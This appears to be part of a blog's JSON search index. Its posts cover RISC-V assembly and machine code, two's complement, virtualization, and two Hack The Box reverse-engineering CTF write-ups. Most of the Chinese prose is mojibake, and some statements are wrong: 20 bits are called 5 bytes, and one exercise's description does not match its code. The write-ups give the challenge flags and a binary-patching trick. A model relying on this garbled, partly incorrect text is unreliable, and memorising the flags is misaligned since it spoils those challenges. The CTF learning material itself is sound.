1addi a,b,&lt;imm&gt; æ³¨æ„ï¼ŒRISC-Vé‡Œæ˜¯æ²¡æœ‰subiè¿™ç§æ“ä½œçš„ï¼Œå› ä¸ºå®ƒå¯ä»¥è¢«addiä»£æ›¿ï¼š subi a,b,xæ˜¯ç­‰ä»·äºaddi a,b,-xçš„ï¼ˆè¿™é‡Œçš„xæ˜¯ä¸€ä¸ªç«‹å³æ•°/å¸¸æ•°ï¼‰ã€‚ ä½†subä¸å¯ä»¥è¢«addæ›¿ä»£ï¼Œæ˜¯å› ä¸ºsub a,b,-cè¿™ä¸ªæ“ä½œä¸åˆè§„ï¼ˆcæ˜¯ä¸€ä¸ªregisterï¼Œä¸å­˜åœ¨-cè¿™ç§æ“ä½œï¼‰ã€‚ è¿™é‡Œå¯ä»¥ä½¿ç”¨çš„ç«‹å³æ•°çš„å¤§å°ä¼šè¢«é™åˆ¶åœ¨$[-2^{11},2^{11}) = [-2048,+2047]$ ï¼ˆå…·ä½“åŸå› ä¼šåœ¨ä¹‹åæœºå™¨ç çš„éƒ¨åˆ†é˜è¿°ï¼‰ ç”Ÿæˆ32-Bitçš„å¸¸æ•°ï¼š éœ€è¦ç”¨åˆ° load upper immediate (lui) å’Œ addi lui çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªå¸¸æ•°åŠ è½½åˆ°ç›®æ ‡å¯„å­˜å™¨çš„é«˜ 20 ä½ï¼ˆä¹Ÿå°±æ˜¯5Bytesï¼‰ï¼Œå¹¶å°†ä½ 12 ä½ï¼ˆ4Bytesï¼‰å¡«å……ä¸º 0ã€‚ è€Œaddiåˆ™è´Ÿè´£å°†ä½ 12 ä½ï¼ˆ4Bytesï¼‰çš„æ•°å€¼åŠ åˆ°ç›®æ ‡å¯„å­˜å™¨ä¸­ã€‚ ä¾‹å­ï¼š C: 1int a = 0xFEDC8765; å¯¹åº”çš„æ±‡ç¼–ï¼š 123# s0 = alui s0, 0xFEDC8 # s0 = 0xFEDC8000addi s0, s0, 0x765 æ³¨æ„ï¼š 12addi a0, zero, -534lui a0, 0 è¿™æ®µè¿è¡Œä¹‹åä¼šå¾—åˆ° a0 çš„å€¼ä¸º0ï¼Œå› ä¸º lui ä¼šå°†ä½12ä½å¡«å……ä¸º0ã€‚ RISC-V æœºå™¨ç  Machine Code/Instrunctionå°†æ±‡ç¼–è¯­è¨€ç¿»è¯‘æˆæœºå™¨ç ä¸»è¦ä¾é ä¸‹é¢è¿™2å¼ è¡¨ï¼š é¦–å…ˆï¼Œæ‰€æœ‰çš„æ“ä½œä¼šè¢«åˆ†æˆ6ä¸ªå¤§ç±»ï¼š Register/register (R) Immediate (I) Upper immediate (U) Store (S) Branch (B) æ¡ä»¶è·³è½¬ Jump (J) ç„¶åä¼šé€šè¿‡funct3ä»¥åŠfunct7ç¡®å®šå…·ä½“æ“ä½œã€‚ï¼ˆfunct7æ›´å¤šçš„æ˜¯ä¸ºäº†æ‰©å±•çš„æ“ä½œ/åŠŸèƒ½ã€‚ï¼‰ rs1, rs2, rdå­˜å‚¨çš„æ˜¯å¯„å­˜å™¨çš„åœ°å€ï¼Œè€Œimmå­˜å‚¨çš„åˆ™æ˜¯ç«‹å³æ•°ï¼ˆimmediateï¼‰çš„æ•°å€¼ã€‚å…¶ä¸­rdæ˜¯ç›®æ ‡å¯„å­˜å™¨ã€‚ ä¾‹å­ï¼š 1addi a1, a2,1 å‡è®¾a1ï¼ˆrdï¼‰ï¼Œa2ï¼ˆrs1ï¼‰çš„åœ°å€ä¸º00010ï¼Œ01010ï¼Œ å› ä¸ºaddiæŒ‡ä»¤çš„opcodeå’Œfunct3ä¸ºï¼š0010011, 000 ï¼Œè¿™è¡Œå‘½ä»¤ä¼šç¿»è¯‘æˆä»¥ä¸‹çš„æœºå™¨ç ï¼š 123imm[11:0] | rs1 | funct3 | rd | opcode------------|-------|--------|-------|--------000000000001| 01010 | 000 | 00010 | 0010011 Store, Branch, Jump æ“ä½œçš„æ ¼å¼é‡Œå°†immçš„å€¼æ‹†æˆå¥½å‡ éƒ¨åˆ†ï¼ˆæ¯”å¦‚è¯´imm[11:5]å’Œimm[4:0]ï¼‰æ˜¯ä¸ºäº†å…¶ä»–å†…å®¹çš„ä½ç½®å¯ä»¥å¯¹é½ï¼Œæ¯”å¦‚è¯´rs2çš„ä½ç½®éƒ½æ˜¯ç¬¬20-24bitã€‚ Branchå’ŒJumpéƒ½æ˜¯è·³è½¬æ“ä½œï¼Œæ‰€ä»¥ä¼šå°†immï¼ˆè·³è½¬åœ°å€ï¼‰çš„ç¬¬ä¸€ä½ï¼ˆç¬¦å·ä½ï¼‰imm[12]æˆ–è€…imm[20]æ”¾åœ¨å¼€å¤´ï¼Œä»¥ç¡®å®šæ˜¯å‘åè·³è½¬è¿˜æ˜¯å‘å‰ã€‚ç„¶åå› ä¸ºRISC-Vçš„å‘½ä»¤éƒ½æ˜¯32ä½çš„ï¼Œä¹Ÿå°±æ˜¯4Byteï¼Œæ‰€ä»¥æ‰€æœ‰åœ°å€éƒ½æ˜¯4çš„å€æ•°ï¼Œä¹Ÿå°±ä¸éœ€è¦imm[0]çš„ä¿¡æ¯äº†ï¼Œå› ä¸ºimm[0]å§‹ç»ˆç­‰äº0ã€‚ ä¾‹é¢˜ä¾‹é¢˜1Register s5 nullen å°†å¯„å­˜å™¨s5çš„å€¼è®¾ä¸º0ï¼š 123mov s5, 0#æˆ–è€…æ˜¯li s5, 0 ä¾‹é¢˜2Wert in Register a1 nach s3 kopieren å°†s3çš„å€¼å¤åˆ¶åˆ°s1é‡Œï¼š 1mv s3, a1 ä¾‹é¢˜3Dasunterste Bit von a0 nach t1 schreiben, restliche Bits sollen 0 sein å°† a0 çš„æœ€ä½ä½å†™å…¥ t1ï¼Œå…¶ä»–ä½æ¸…é›¶: 1andi t1, a0, 1 1åœ¨äºŒè¿›åˆ¶ä¸­åªæœ‰æœ€åä¸€ä½æ˜¯1ï¼Œå…¶ä»–ä½ç½®éƒ½æ˜¯0ï¼Œæ‰€ä»¥a0çš„å…¶ä»–ä½ç½®ä¸0è¿›è¡Œandæ“ä½œéƒ½ä¼šå¾—åˆ°0ï¼Œè€Œæœ€åä¸€ä½ä¸1è¿›è¡Œandæ“ä½œä¼šä¿ç•™åŸæœ¬å†…å®¹ã€‚ ä¾‹é¢˜4Register s1 mit Einsen fÃ¼llen å°†å¯„å­˜å™¨ s1çš„å€¼çš„æ¯ä¸€ä½éƒ½è®¾ä¸º 1ï¼š 1li s1, -1 å› ä¸º-1 çš„äºŒè¿›åˆ¶è¡¨ç¤ºå…¨ 1 ä¾‹é¢˜5Unterstes Byte von t0 nach a0 schreiben, Rest unverÃ¤ndert å°† t0 çš„æœ€ä½å­—èŠ‚å†™å…¥ a0ï¼Œä¿æŒå…¶ä½™éƒ¨åˆ†ä¸å˜ï¼š 12andi a0, a0, -256 # æ¸…é™¤ a0 çš„æœ€ä½å­—èŠ‚ (0xFFFFFF00)or a0, a0, t0 # ç›´æ¥åˆå¹¶ t0 ä½å­—èŠ‚ -256çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º 11111 1111 1111 1111 1111 1111 0000 0000 æœ€åä¸€ä¸ªByteçš„å†…å®¹éƒ½æ˜¯0ï¼Œæ‰€ä»¥å°†å®ƒä¸a0è¿›è¡Œandæ“ä½œå¯ä»¥æ¸…é™¤a0çš„æœ€åä¸€ä¸ªByteçš„å†…å®¹ï¼Œå‰é¢çš„ä¿ç•™ã€‚ ç„¶åå°†a0å’Œt0ç›´æ¥è¿›è¡Œoræ“ä½œï¼Œä¼šä¿ç•™a0çš„å‰é¢éƒ¨åˆ†ï¼Œä»¥åŠt0çš„æœ€åä¸€ä¸ªByteçš„å†…å®¹ã€‚","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/ERA-è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"æ±‡ç¼–è¯­è¨€","slug":"æ±‡ç¼–è¯­è¨€","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"}]},{"title":"1 EinfÃ¼hrung und DatenreprÃ¤sentation","slug":"TUM info ç¬”è®°/ERA/ERA-1-Einfuhrung-und-Datenreprasentation","date":"2025-03-18T12:12:02.000Z","updated":"2025-04-26T18:30:23.988Z","comments":true,"path":"2025/03/18/TUM info ç¬”è®°/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","permalink":"https://archer-baiyi.github.io/2025/03/18/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","excerpt":"è®¡ç®—æœºä½“ç³»ç»“æ„åŸºç¡€ç›¸å…³ç¬”è®°","text":"EinfÃ¼hrung in die Rechnerarchitektur (ERA)DatendarstellungenZahlensystemeDezimalsystem BinÃ¤rsystem Hexadezimalsystem GÃ¤ngige WortlÃ¤ngen Negative Ganze Zahlenå‡å¦‚ä¸“é—¨ç”¨ä¸€ä¸ªBitæ¥è¡¨ç¤ºæ­£è´Ÿå·ï¼ˆæ¯”å¦‚è¯´)ï¼Œè¿™æ ·å­åšä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼š 0 = 1+(-1) \\Longleftrightarrow 0000 0000 = 1000 0001 + 0000 0001 = 1000 0000æ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨Zweierkomplementï¼Œå³Invertierung (Einerkomplement) + 1ã€‚ ä¾‹å­ï¼š è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯åŠ æ³•ä¼šéå¸¸è‡ªç„¶ï¼š -1 + 1 = 1111 1111 + 0000 0001 = 1 0000 0000 \\rightarrow 0000 0000 = 0","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/ERA-è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"è®¡ç®—æœºä½“ç³»ç»“æ„","slug":"è®¡ç®—æœºä½“ç³»ç»“æ„","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}]},{"title":"HTB_rev Find The Easy Pass Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup","date":"2025-03-16T21:39:15.000Z","updated":"2025-04-02T21:32:57.935Z","comments":true,"path":"2025/03/16/CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/16/CTF/Reverse%20Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","excerpt":"","text":"è¿™é“é¢˜ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªexeæ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ªåˆ¤æ–­è¾“å…¥çš„å¯†ç æ˜¯å¦æ­£ç¡®çš„è½¯ä»¶ï¼š æˆ‘ä»¬ç”¨IDAæ‰“å¼€å®ƒï¼Œä¼šå‘ç°å¹¶æ²¡æœ‰åç¼–è¯‘å‡ºmain()å‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ç‚¹å†…å®¹è¯•ä¸€ä¸‹ï¼š ä¼šè¿”å›Wrong Password!å­—æ ·ã€‚æ¥ç€æˆ‘ä»¬å°è¯•ç”¨IDAæœç´¢è¿™æ®µå†…å®¹ï¼Œä¼šå‘ç°ï¼š ç‚¹å‡»ç¬¬äºŒä¸ªç»“æœä¼šè·³è½¬åˆ°ï¼š æ³¨æ„åˆ°å®ƒçš„ä¸Šæ–¹æœ‰ç€â€Goob Job. Congratulationâ€çš„å­—æ ·ï¼Œæˆ‘ä»¬çŒœæµ‹è¿™æ˜¯è¾“å…¥æˆåŠŸåè¿”å›çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç‚¹å‡»å®ƒä¸‹æ–¹ XREFçš„å†…å®¹ï¼ŒæŸ¥çœ‹è¿™ä¸ªå˜é‡åœ¨å“ªé‡Œè¢«è°ƒç”¨è¿‡ï¼Œé€šè¿‡åæ±‡ç¼–ä¼šå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall TForm1_Button1Click(int a1)&#123; int v2; // ecx int v3; // edx char v4; // zf unsigned int v6[2]; // [esp-Ch] [ebp-38h] BYREF int *v7; // [esp-4h] [ebp-30h] int v8; // [esp+4h] [ebp-28h] BYREF int v9; // [esp+8h] [ebp-24h] BYREF int v10; // [esp+Ch] [ebp-20h] BYREF int v11; // [esp+10h] [ebp-1Ch] BYREF int v12; // [esp+14h] [ebp-18h] BYREF int v13; // [esp+18h] [ebp-14h] BYREF int v14; // [esp+1Ch] [ebp-10h] BYREF int v15; // [esp+20h] [ebp-Ch] BYREF int v16; // [esp+24h] [ebp-8h] BYREF int v17; // [esp+28h] [ebp-4h] BYREF int savedregs; // [esp+2Ch] [ebp+0h] BYREF v7 = &amp;savedregs; v6[1] = (unsigned int)&amp;loc_454171; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]); System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]); System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]); System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]); System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]); System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760)); System::__linkproc__ LStrCmp(v8, v17); if ( v4 ) Dialogs::ShowMessage((Dialogs *)&amp;str_Good_Job__Congr[1], v3); else Dialogs::ShowMessage((Dialogs *)&amp;str_Wrong_Password_[1], v3); __writefsdword(0, v6[0]); v7 = (int *)&amp;loc_454178; System::__linkproc__ LStrClr(&amp;v8); return System::__linkproc__ LStrArrayClr(&amp;v9, 9);&#125; è¿™æ®µä»£ç çš„ä¸»è¦é€»è¾‘æ˜¯å°†è¿™äº›èµ‹å€¼å˜é‡ 123456789System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]);System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]);System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]);System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]);System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]);System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); æ‹¼æ¥æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸² v17 1System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); ç„¶åæ¯”è¾ƒè¾“å…¥çš„å­—ç¬¦ä¸²ä¸v17ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŸ¥çœ‹é‚£äº›èµ‹å€¼å­—ç¬¦ä¸²çš„å…·ä½“å€¼ä¾¿å¯å¾—åˆ°å¯†ç ï¼šfortran! æŒ‰ç…§é¢˜ç›®è¦æ±‚flagå†…å®¹ä¸ºï¼šHTB{fortran!}ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"HTB_rev Behind the Scenes Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup","date":"2025-03-12T01:22:42.000Z","updated":"2025-04-02T21:33:08.443Z","comments":true,"path":"2025/03/12/CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/12/CTF/Reverse%20Engineering/HTB-rev-Behind-the-Scenes-Writeup/","excerpt":"","text":"ç”¨010 Editor ï¼ˆæˆ–è€…Hex Editorä¹‹ç±»çš„éƒ½è¡Œï¼‰æ‰“å¼€æºæ–‡ä»¶ï¼Œå°†é‡Œé¢æ‰€æœ‰çš„ 0F 0B ï¼ˆå³ ud2 ï¼‰æ”¹ä¸º 90 90 ï¼ˆ90å³NOPï¼Œæ˜¯Machine Codeä¸­è¡¨ç¤º æ— æ“ä½œ (No Operation) çš„å‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨IDAæ‰“å¼€æ–‡ä»¶å³å¯çœ‹åˆ°å®Œæ•´çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __fastcall main(int argc, const char **argv, const char **envp){ struct sigaction s; // [rsp+10h] [rbp-A0h] BYREF unsigned __int64 v5; // [rsp+A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, sizeof(s)); sigemptyset(&amp;s.sa_mask); s.sa_handler = (__sighandler_t)segill_sigaction; s.sa_flags = 4; sigaction(4, &amp;s, 0LL); if ( argc == 2 ) { if ( strlen(argv[1]) == 12 ) { if ( !strncmp(argv[1], \"Itz\", 3uLL) ) { if ( !strncmp(argv[1] + 3, \"_0n\", 3uLL) ) { if ( !strncmp(argv[1] + 6, \"Ly_\", 3uLL) ) { if ( !strncmp(argv[1] + 9, \"UD2\", 3uLL) ) printf(\"&gt; HTB{%s}\\n\", argv[1]); return 0; } else { return 0; } } else { return 0; } } else { return 0; } } else { return 0; } } else { puts(\"./challenge &lt;password&gt;\"); return 1; }} æ‰€ä»¥flagä¸º 1HTB{Itz_0nLy_UD2}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"GBS 9 Virtualisierung è™šæ‹ŸåŒ–","slug":"TUM info ç¬”è®°/GBS/GBS-9-Virtualisierung-è™šæ‹ŸåŒ–","date":"2025-03-11T17:17:37.000Z","updated":"2025-04-26T18:31:20.121Z","comments":true,"path":"2025/03/11/TUM info ç¬”è®°/GBS/GBS-9-Virtualisierung-è™šæ‹ŸåŒ–/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-9-Virtualisierung-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"EinfÃ¼hrung Abstraktionssichten: å¤æ‚ç³»ç»Ÿå¯ä»¥é€šè¿‡æŠ½è±¡å±‚æ›´å¥½åœ°æè¿°ã€‚ Fokus auf relevante FunktionalitÃ¤ten æŠ½è±¡å±‚é€šè¿‡æ¥å£ï¼ˆInterfacesï¼‰ç›¸äº’åˆ†ç¦»ï¼ˆdurch Schnittstellen (Interfaces) voneinander getrenntï¼‰ï¼š ä½¿å¾—æ¯ä¸€å±‚å¯ä»¥ç‹¬ç«‹å¼€å‘å’Œå®ç°ï¼Œå¹¶ä¸”é«˜å±‚ç³»ç»Ÿåªéœ€è¦ä¸æ¥å£äº¤äº’ï¼Œè€Œä¸éœ€è¦äº†è§£åº•å±‚å®ç°ã€‚ z.B. Systemcalls: Implementierung durch Interface verborgen ï¼š åªéœ€è¦ç›´æ¥ç”¨read(), write()è¿™äº›å‘½ä»¤ï¼Œä¸éœ€è¦å…³æ³¨/çŸ¥é“è¿™äº›è°ƒç”¨åœ¨å†…æ ¸ä¸­çš„å…·ä½“å®ç°ã€‚ Interfaces kÃ¶nnen die Software Sicht auf die Hardware definieren ï¼šè½¯ä»¶å¯ä»¥é€šè¿‡æ¥å£æ¥è®¿é—®ç¡¬ä»¶ï¼Œè€Œæ— éœ€ç›´æ¥æ“ä½œç¡¬ä»¶ã€‚ Interfaces Instruction Set Architecture (ISA): æŒ‡ä»¤é›†æ¶æ„ Interface zwischen dem BS und Hardware æ˜¯æ“ä½œç³»ç»Ÿä¸ç¡¬ä»¶ä¹‹é—´çš„æ¥å£ besteht aud User- und System-ISA Application Binary Interface (ABI): åº”ç”¨äºŒè¿›åˆ¶æ¥å£ Interface zwischen Anwendungen und dem Betriebssystem æ˜¯åº”ç”¨ç¨‹åºä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„æ¥å£ besteht aus dem System Call Interface und der User ISA Die Sicht auf das System hÃ¤ngt von der Software-Perspektive abï¼š å¦‚æœæ˜¯å¼€å‘æ“ä½œç³»ç»Ÿçš„è¯ï¼Œåˆ™éœ€è¦è€ƒè™‘æ“ä½œç³»ç»Ÿä¸ç¡¬ä»¶çš„äº¤äº’æ¥å£ï¼ˆisaï¼‰ï¼› è€Œå¦‚æœæ˜¯å¼€å‘æ™®é€šè½¯ä»¶çš„è¯ï¼Œåˆ™æ›´å…³æ³¨è½¯ä»¶ä¸æ“ä½œç³»ç»Ÿçš„æ¥å£ï¼ˆabiï¼‰ï¼Œç›¸å½“äºé€šè¿‡æ“ä½œç³»ç»Ÿæ¥è®¿é—®ç¡¬ä»¶ã€‚ Ein Hardware-System (physische Maschine) bietet eine Laufzeitumgebung fÃ¼r die darÃ¼berliegende Softwareï¼š BS virtualisiert bereits: Prozesse, virtueller Speicher und Abstraktionen Eine Virtuelle Maschine implementiert eine virtuelle Laufzeitumgebungï¼š Abbilden von virtuellen auf physische Ressourcen è™šæ‹Ÿè¿è¡Œç¯å¢ƒçš„åˆ†ç±» System Virtual Machinesï¼ˆç³»ç»Ÿè™šæ‹Ÿæœºï¼‰ è™šæ‹ŸåŒ–æ•´ä¸ªç³»ç»Ÿ Process Virtual Machinesï¼ˆè¿›ç¨‹è™šæ‹Ÿæœºï¼‰ ä»…ä¸ºå•ä¸ªè¿›ç¨‹æä¾›è™šæ‹Ÿç¯å¢ƒ Anforderungen an Virtualisierung å¯¹è™šæ‹ŸåŒ–çš„è¦æ±‚ Equivalences / Fidelityï¼šç­‰æ•ˆæ€§ è™šæ‹ŸåŒ–åº”è¯¥è®©æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºæ— éœ€ç‰¹æ®Šä¿®æ”¹ï¼ˆæˆ–è€…æœ€å°ç¨‹åº¦çš„æ”¹åŠ¨ï¼‰ä¾¿å¯ä»¥åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œã€‚ Resource Control / Safety (Isolation)ï¼š éš”ç¦»æ€§ å¿…é¡»ç¡®ä¿è™šæ‹Ÿæœºï¼ˆçš„èµ„æºï¼‰å½¼æ­¤ä¸ä¼šå½±å“ï¼›Hypervisoréœ€è¦æ§åˆ¶æ‰€æœ‰åº•å±‚èµ„æº Efficiency / Performanceï¼šæ€§èƒ½ å¤§éƒ¨åˆ†æŒ‡ä»¤åº”è¯¥ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œ ç³»ç»Ÿè™šæ‹Ÿæœº ï¼ˆSystem Virtual Machinesï¼‰æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦ç³»ç»Ÿè™šæ‹Ÿæœºï¼Ÿ æ¨¡æ‹Ÿï¼ˆEmulationï¼‰ ä½¿å¾—æ“ä½œç³»ç»Ÿå¯ä»¥åœ¨ä¸åŒçš„ ISAä¸Šè¿è¡Œï¼Œå¹¶ä¸”åœ¨è™šæ‹Ÿæœºä¸­è°ƒè¯•æ“ä½œç³»ç»Ÿé€šå¸¸æ¯”åœ¨ç‰©ç†ç¡¬ä»¶ï¼ˆè£¸æœºï¼‰ä¸Šæ›´æ–¹ä¾¿ã€‚ éš”ç¦»ï¼ˆIsolationï¼‰ å—æŸæˆ–é­åˆ°æ”»å‡»çš„ Guest OS æ— æ³•å½±å“å…¶ä»–è™šæ‹Ÿæœºï¼Œä¹Ÿæ— æ³•ä¿®æ”¹ Hypervisor æœ¬èº«ã€‚ å®‰å…¨æ€§ï¼ˆSicherheitï¼‰ Hypervisor æ›´å®¹æ˜“ä¿æŠ¤ï¼ˆä»£ç é‡è¾ƒå°ã€æƒé™è¾ƒé«˜ï¼‰ã€‚ èµ„æºåˆ©ç”¨ï¼ˆRessourcennutzungï¼‰ ç‰©ç†ç¡¬ä»¶èµ„æºå¯ä»¥æ›´å¥½ï¼ˆæ›´çµæ´»ï¼‰åœ°åˆ†é…å’Œåˆ©ç”¨ã€‚ Hypervisor / Virtual Machine Monitor (VMM) è™šæ‹Ÿæœºç›‘æ§å™¨Hypervisorè´Ÿè´£ç»™æ“ä½œç³»ç»Ÿæä¾›è¿è¡Œç¯å¢ƒï¼Œé€šå¸¸ä¼šåˆ†ä¸º2ç±»ï¼š Typ 1 Hypervisor /Bare-Metal-Hypervisor ï¼ˆè£¸æœºå¼ï¼‰ ç›´æ¥åœ¨ç‰©ç†ç¡¬ä»¶ä¸Šè¿è¡Œå®¹å™¨ï¼Œæ²¡æœ‰é¢å¤–è™šæ‹ŸåŒ–å±‚çš„å­˜åœ¨ã€‚è¿™ç§æ–¹å¼çš„ä¸»è¦ä¼˜ç‚¹åœ¨äºæ€§èƒ½çš„æè‡´ä¼˜åŒ–ï¼Œå› ä¸ºæ²¡æœ‰è™šæ‹ŸåŒ–å¸¦æ¥çš„å¼€é”€ã€‚ æ¯”å¦‚ Xen, Hyper-V, VMware ESXã€‚ Typ 2 Hypervisor ï¼ˆæ‰˜ç®¡å¼ï¼‰ ä¾èµ–äºå®¿ä¸»æ“ä½œç³»ç»Ÿçš„æœåŠ¡ï¼ˆ Verwendet Dienste des Host-BSï¼‰ã€‚ æ¯”å¦‚ KVM, VirtualBox, VMware Workstationã€‚ Hypervisorå®ç°äº†ä¸€ä¸ªè™šæ‹Ÿçš„ ISAï¼ŒåŒæ ·åˆ†User- å’Œ System-ISAã€‚ Hypervisorè™šæ‹ŸåŒ–æ•´ä¸ªç‰©ç†æœºå™¨ï¼Œå¹¶ä¸”æä¾›è™šæ‹ŸåŒ–ç¡¬ä»¶ä½œä¸ºå€Ÿå£è®©Gast-BSå¯ä»¥åœ¨ä¸Šé¢è¿è¡Œã€‚å¯ä»¥ä½¿å¾—Gast-BSä»¥ä¸º/äº§ç”Ÿé”™è§‰ï¼ˆIllusionï¼‰è‡ªå·±å¯¹ç¡¬ä»¶æ‹¥æœ‰å®Œæ•´çš„æ§åˆ¶æƒã€‚ä½†å®é™…ä¸Šå¯¹äºHypervisoræ¥è¯´ï¼ŒGast-BSå°±åªæ˜¯ä¸ªè½¯ä»¶è€Œå·²ã€‚ è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºå¯ä»¥è¿è¡Œä»»æ„æ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸”å¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªç›¸åŒæˆ–ä¸åŒçš„æ“ä½œç³»ç»Ÿã€‚ Hypervisor 